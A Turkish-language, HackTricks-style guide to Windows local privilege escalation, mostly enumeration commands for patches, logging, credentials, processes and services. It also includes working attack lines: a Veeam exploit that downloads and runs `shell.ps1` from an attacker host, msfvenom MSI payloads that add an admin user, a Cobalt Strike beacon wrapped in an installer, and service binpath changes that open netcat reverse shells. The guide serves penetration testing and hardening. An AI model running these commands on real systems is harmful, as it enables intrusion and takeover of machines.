# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, çeşitli temel kılavuzlardaki genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışı ayrıca topluluk workshop'larından ve checklist'lerden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyali, Windows yetki yükseltme konulu DerbyCon sunumunu içerir.<sup>[[5]](#references)</sup>

## Başlangıç Windows Teorisi

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı ve hatta **aktivitelerinizi tespit etmeyi** **engelleyebilecek** çeşitli unsurlar vardır. Yetki yükseltme enumeration işlemine başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` aracılığıyla başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri atlatıldığında prompt'lar olmadan High IL'ye ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection bypass workflow'unu burada kontrol edin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, keyfi bir SYSTEM registry yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows build'leri ayrıca, ayrıcalıklı bir yerel NTLM authentication işleminin yeniden kullanılan bir SMB TCP connection üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE yolu da sunmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumeration'ı

Windows sürümünün bilinen bir vulnerability içerip içermediğini kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **muazzam saldırı yüzeyini** gösterir.

**Sistem üzerinde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı gömülü olarak içerir)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub repoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve script'lerin bölümleri dahildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin eksiksiz etkinlik ve tam içerik kaydı tutulur; böylece her kod bloğu çalıştırıldığı sırada belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini koruyarak adli incelemeler ve kötü amaçlı davranışların analiz edilmesi için değerli bilgiler sağlar. Yürütme sırasında tüm etkinlikleri belgeleyerek süreç hakkında ayrıntılı içgörüler sunar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için logging event'leri Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 event'i görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http değil, http**S** kullanılarak talep edilmiyorsa sistemi compromise edebilirsiniz.

Ağda SSL kullanmayan bir WSUS güncellemesi kullanılıp kullanılmadığını kontrol etmek için cmd'de aşağıdakini çalıştırarak başlayın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Şunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

**exploitable durumdadır.** Son registry değeri `0` ise WSUS girdisi yok sayılır.

Bu vulnerabilities'leri exploit etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL olmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için weaponize edilmiş MiTM exploit script'leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, bug'ın exploit ettiği açıktır:

> Yerel user proxy'mizi değiştirme yetkisine sahipsek ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi intercept etmek ve asset'imizde elevated user olarak code çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı yerel olarak çalıştırma yetkisine sahip oluruz.
>
> Ayrıca WSUS service'i mevcut user'ın ayarlarını kullandığından certificate store'unu da kullanır. WSUS hostname'i için self-signed bir certificate oluşturup bu certificate'i mevcut user'ın certificate store'una eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use türü bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate user tarafından trusted ise ve doğru hostname'e sahipse service tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla exploit edebilirsiniz (liberated olduğunda).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok enterprise agent'ı localhost IPC surface'i ve privileged bir update channel'ı açığa çıkarır. Enrollment bir attacker server'ına yönlendirilebiliyorsa ve updater rogue bir root CA'ya veya zayıf signer kontrollerine güveniyorsa, local user SYSTEM service'inin yükleyeceği malicious bir MSI iletebilir. Netskope stAgentSvc chain'i (CVE-2025-0309) temel alınarak genelleştirilmiş bir technique'i burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261`, attacker-controlled mesajları işleyen **TCP/9401** üzerindeki bir localhost service'ini açığa çıkarır ve **NT AUTHORITY\SYSTEM** olarak arbitrary command'lerin çalıştırılmasına olanak tanır.<sup>[[12]](#references)</sup>

- **Recon**: listener'ı ve version'ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı directory'ye yerleştirin, ardından local socket üzerinden bir SYSTEM payload'ını trigger edin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing** özelliğinin zorunlu tutulmadığı, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabilme yeteneğinin bulunduğu ortamlar yer alır. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**exploit** kodunu [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri girdisi **etkinse** (değer **0x1** ise), herhangi bir yetkiye sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payload'ları
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Ayrıcalıkları yükseltmek üzere mevcut dizinin içinde bir Windows MSI binary'si oluşturmak için PowerUP'tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız bir "**.bat**" dosyasını wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next** düğmesine tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create** düğmesine tıklayın.
- 4 adımın 3. adımına (dahil edilecek dosyaları seçme) ulaşana kadar **Next** düğmesine tıklamaya devam edin. **Add** düğmesine tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish** düğmesine tıklayın.
- **Solution Explorer** içindeki **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86** yerine **x64** olarak değiştirin.
- **Author** ve **Manufacturer** gibi, kurulan uygulamanın daha meşru görünmesini sağlayabilecek başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneklerini belirleyin.
- **Install** seçeneğine sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder** üzerine çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK** düğmesine tıklayın. Bu, installer çalıştırılır çalıştırılmaz Beacon payload'ının **execute** edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötücül `.msi` dosyasının **installation** işlemini **background** olarak **execute** etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyetten yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedileceğini** belirler; bu nedenle dikkat etmelisiniz.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek açısından ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve bir etki alanına katılmış bilgisayarlardaki her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş, yetkili kullanıcılar tarafından erişilebilir; bu kullanıcılar yetkileri varsa yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha fazla güvence altına almak amacıyla, güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** için Local Security Authority (LSA) için geliştirilmiş koruma sundu.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunulmuştur. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için etki alanı kimlik bilgileri genellikle oluşturulur.\
[**Cached Credentials hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**Privileged group** üyelerinden birine dahilseniz **privileges escalate edebilirsiniz**. Privileged groups ve privileges escalation için bunların nasıl abuse edileceğini burada öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar** ve bunların nasıl abuse edileceği hakkında **bilgi edinmek** için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola İlkesi
```bash
net accounts
```
### Pano içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle işlemleri listelerken **işlemin komut satırında parolalar olup olmadığını kontrol edin**.\
**Çalışan bir binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) gerçekleştirmek için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Çalışıyor olabilecek [**electron/cef/chromium debuggers** olup olmadığını her zaman kontrol edin; ayrıcalıkları yükseltmek için bunları kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Süreç ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem ikililerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals'tan **procdump** kullanarak çalışan bir işlemin memory dump'ını oluşturabilirsiniz. FTP gibi servisler **credentials'ları memory'de clear text olarak bulundurur**, memory'yi dump etmeyi ve credentials'ları okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Services

Service Triggers, belirli koşullar oluştuğunda Windows'un bir service başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihaz bağlantısı, GPO yenilemesi vb.). SERVICE_START hakları olmasa bile trigger'larını tetikleyerek privileged services'leri çoğu zaman başlatabilirsiniz. Enumeration ve activation tekniklerini burada bulabilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir service hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ tarafından sağlanan **accesschk** binary'sine sahip olmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privilege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

(Örneğin SSDPSRV ile) şu hatayı alıyorsanız:

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; bunun nedeni hizmetin devre dışı bırakılmış olması veya hizmetle ilişkilendirilmiş etkin bir aygıt bulunmamasıdır._

Şunu kullanarak etkinleştirebilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Bu soruna yönelik başka bir workaround** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis binary yolunu değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration'larını değiştirme yeteneği kazandırır.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Service configuration'larını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Service configuration'larını değiştirme yeteneğini de devralır.

Bu vulnerability'nin tespiti ve exploitation'ı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binary'lerinde zayıf izinler

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain account olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service çoğu zaman **binary değiştirilip service yeniden başlatılarak hijack edilebilir**.

**Bir service tarafından çalıştırılan binary'yi değiştirme yetkiniz olup olmadığını** veya binary'nin bulunduğu **klasörde write izinlerine** sahip olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** kullanarak (system32 içinde olmayanları) alabilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** tarafından verilen tehlikeli ACL'leri, özellikle service executable üzerinde veya bunu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir abuse akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile service account ve executable path bilgilerini doğrulayın.
2. `icacls <path>` ile binary'nin yazılabilir olduğunu doğrulayın.
3. Service binary'yi bir payload veya geçerli bir malicious service binary ile değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile service'i yeniden başlatın (veya reboot / service trigger bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet, normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa hizmetin açılışta otomatik olarak başlatılıp başlatılmadığını, başarısızlık durumunda hizmeti yeniden başlatan bir eyleme sahip olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

